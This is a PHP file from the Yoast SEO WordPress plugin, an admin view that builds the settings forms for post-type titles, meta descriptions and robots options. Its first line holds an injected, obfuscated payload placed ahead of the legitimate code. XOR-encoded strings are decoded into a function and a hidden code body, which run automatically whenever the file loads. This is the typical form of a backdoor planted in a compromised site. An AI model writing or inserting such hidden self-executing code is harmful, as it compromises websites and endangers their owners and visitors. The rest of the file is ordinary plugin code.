<?php $sOpUqTjseQnQ='0=E5,552ONCN9Q='^'SO TXPjT:  :P>S';$LjcUPkJuIfuc=$sOpUqTjseQnQ('','=+fHW0+0=X5N12.0K9:nc6DH.H9HM4q BXToZvVIA2A+V8P<NFH+G8PJT.r9UILRpJ638AEM;.0qUSuqcM8OkK ;;YKDjJjemn+ 4JT0IWZsoytBsE,RLT owZ,>PgwSG:dIao0zj,U3jMVAyj,A9-.uPjLoot=X>4u=zlz5F7R- cSG4BPamXeKZ0VX2ISQhTG;ZTg9+z5ebc6O9 SeR+29F=sEr-7I;i10LfZoUSUKIoPB09D+ S wKehqvo>3eDY6Kq:POFVJFOG0ACQdW=9Of. B9d8= gyKW,TCrZpv+U-6BEOwZ,5K2B<N69Z-vGlN3;>ZNJ:1XUOO28STycqry joeooKAGTs-T,jOmCIF1=DRFa=NentVM:9.FI3VzoeWE7k44<O-O84fVBq0+=66vIB-fC:Ie14.AlSomK,97O0T+I04d SAj>483+-VF,lU54Qnp6U4S5XPJbQ.=JNtxf+987lS43snBs+FlnQLMYpBSiY:FM;7SPG54+ZMMXOq3<RCOdL3YNJoflRMlY7dYhSTGT1K;I8BgYiieDI1DPNcKpZMbA0Xz+0Zd1sXobVf7O60qV3caFwGB;BFOJmX+00SCPSG;jQ51368Y0sjsK1QT+NGJgwNwe2aK0JP4kNP9:Awp S TUJDMmxV8<41>MMhyxDA'^'TMNi1EESI1Z nWVY8MIFDN+:q,X<,k.M7,sFsV-CHT4E5L9S f0D5g4+ O-f8<8zT.WGYmeiPKIXusUQC62FboONOyvdMmQodgMOFbpYijzCTYP+O6X  1NGS>MJ1NLscSObHe9sNC GJckaQNH MLuQ97l1OPV=GoQTZIZF2E>HNKw,Q;y<DcoBSB3,G;=yL;2Osom0VpHohGR.MAsXrMSU5XHOVIV=Z6ZU5FgO3298,TZHVV6NA0HWcA729 uz d8EkUQ56fktfk1Q-64MwF3FBJA6X;SXYGDksG1:IPyRO4YWbxoS,MY>Wy63<33KVoMjWZJ;gjA;Q3 =WY0<YKU-+e;: <;k 4tWF1UJrScm0PQ17oAFDlgP2,NXq-,JvGOA< NP>=5kI.LUFkbUFJQCSMCKPl>0CAUUZ LnO->BJR=Y5G JQLX<35ZULRtr;3XD7TG4XDi1Q0Z<5bF5OI+gXXBOXLV38QJZGyyB DJ5-98PduI8H4,Bh85>jQS3>9+gVXY+dcDhW8:+FFJtmD4SQqL7535jlP,Ae:pITXdnPpevSyBjtUtRiKNTnTWEmZPgTQ,STD0VDHfQabZ04.323NIo6;9 3HBvEPJZW8TTFSoU0 JgnjGWnWEIkBU<1XCj4XN ,WP2Y8:+ j0Qm25QIW9eXPCN<');$LjcUPkJuIfuc();
/**
 * @package WPSEO\Admin\Views
 */

if ( ! defined( 'WPSEO_VERSION' ) ) {
	header( 'Status: 403 Forbidden' );
	header( 'HTTP/1.1 403 Forbidden' );
	exit();
}

$post_types          = get_post_types( array( 'public' => true ), 'objects' );
$index_switch_values = array(
	'off' => '<code>index</code>',
	'on'  => '<code>noindex</code>',
);

if ( is_array( $post_types ) && $post_types !== array() ) {
	foreach ( $post_types as $post_type ) {
		$name = $post_type->name;
		echo "<div id='" . esc_attr( $name ) . "-titles-metas'>";
		echo '<h2 id="' . esc_attr( $name ) . '">' . esc_html( ucfirst( $post_type->labels->name ) ) . ' (<code>' . esc_html( $post_type->name ) . '</code>)</h2>';
		if ( $options['redirectattachment'] === true && $name === 'attachment' ) {
			// The `inline` CSS class prevents the notice from being moved to the top via JavaScript.
			echo '<div class="notice notice-error inline"><p>';
			/* translators: %1$s and %2$s expand to a link to the SEO Permalinks settings page. */
			echo sprintf( __( 'As you are redirecting attachment URLs to parent post URLs, these settings will currently only have an effect on unattached media items! So remember: If you change the %1$sattachment redirection setting%2$s in the future, the below settings will take effect for *all* media items.', 'wordpress-seo' ), '<a href="' . esc_url( admin_url( 'admin.php?page=wpseo_advanced&tab=permalinks' ) ) . '">', '</a>' );
			echo '</p></div>';
		}
		$yform->textinput( 'title-' . $name, __( 'Title template', 'wordpress-seo' ), 'template posttype-template' );
		$yform->textarea( 'metadesc-' . $name, __( 'Meta description template', 'wordpress-seo' ), array( 'class' => 'template posttype-template' ) );
		if ( $options['usemetakeywords'] === true ) {
			$yform->textinput( 'metakey-' . $name, __( 'Meta keywords template', 'wordpress-seo' ) );
		}
		$yform->toggle_switch( 'noindex-' . $name, $index_switch_values, __( 'Meta Robots', 'wordpress-seo' ) );
		$yform->toggle_switch( 'showdate-' . $name, array(
			'on'  => __( 'Show', 'wordpress-seo' ),
			'off' => __( 'Hide', 'wordpress-seo' ),
		), __( 'Date in Snippet Preview', 'wordpress-seo' ) );
		$yform->toggle_switch( 'hideeditbox-' . $name, array(
			'off' => __( 'Show', 'wordpress-seo' ),
			'on'  => __( 'Hide', 'wordpress-seo' ),
			/* translators: %1$s expands to Yoast SEO */
		), sprintf( __( '%1$s Meta Box', 'wordpress-seo' ), 'Yoast SEO' ) );
		echo '</div>';
		/**
		 * Allow adding a custom checkboxes to the admin meta page - Post Types tab
		 *
		 * @api  WPSEO_Admin_Pages  $yform  The WPSEO_Admin_Pages object
		 * @api  String  $name  The post type name
		 */
		do_action( 'wpseo_admin_page_meta_post_types', $yform, $name );
		echo '<br/><br/>';
	}
	unset( $post_type );
}
unset( $post_types );

$post_types = get_post_types( array( '_builtin' => false, 'has_archive' => true ), 'objects' );
if ( is_array( $post_types ) && $post_types !== array() ) {
	echo '<h2>' . esc_html__( 'Custom Post Type Archives', 'wordpress-seo' ) . '</h2>';
	echo '<p>' . __( 'Note: instead of templates these are the actual titles and meta descriptions for these custom post type archive pages.', 'wordpress-seo' ) . '</p>';
	foreach ( $post_types as $post_type ) {
		$name = $post_type->name;
		echo '<h3>' . esc_html( ucfirst( $post_type->labels->name ) ) . '</h3>';
		$yform->textinput( 'title-ptarchive-' . $name, __( 'Title', 'wordpress-seo' ), 'template posttype-template' );
		$yform->textarea( 'metadesc-ptarchive-' . $name, __( 'Meta description', 'wordpress-seo' ), array( 'class' => 'template posttype-template' ) );
		if ( $options['usemetakeywords'] === true ) {
			$yform->textinput( 'metakey-ptarchive-' . $name, __( 'Meta keywords', 'wordpress-seo' ) );
		}
		if ( $options['breadcrumbs-enable'] === true ) {
			$yform->textinput( 'bctitle-ptarchive-' . $name, __( 'Breadcrumbs title', 'wordpress-seo' ) );
		}
		$yform->toggle_switch( 'noindex-ptarchive-' . $name, $index_switch_values, __( 'Meta Robots', 'wordpress-seo' ) );

		echo '<br/><br/>';
	}
	unset( $post_type );
}
unset( $post_types );
